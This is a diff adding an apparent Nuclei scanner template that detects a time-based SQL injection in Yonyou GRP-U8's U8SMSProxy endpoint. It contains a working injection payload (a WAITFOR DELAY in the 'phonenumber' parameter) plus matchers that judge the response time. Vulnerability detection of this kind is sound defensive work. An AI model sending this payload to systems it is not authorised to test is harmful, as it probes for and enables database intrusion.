@@ -1,0 +1,29 @@
+id: poc-yaml-yong-you-grp-u8-u8msproxy-sqli
+info:
+  name: 用友GRP-U8 U8SMSProxy SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,两高一弱
+  metadata:
+    fingerprint: GRP-U8
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/U8SMSProxy?class=XXNote&id=qrywfs&phonenumber=1'WAITFOR+DELAY+'0:0:{{t1}}'--+"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"total\":\"0\""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
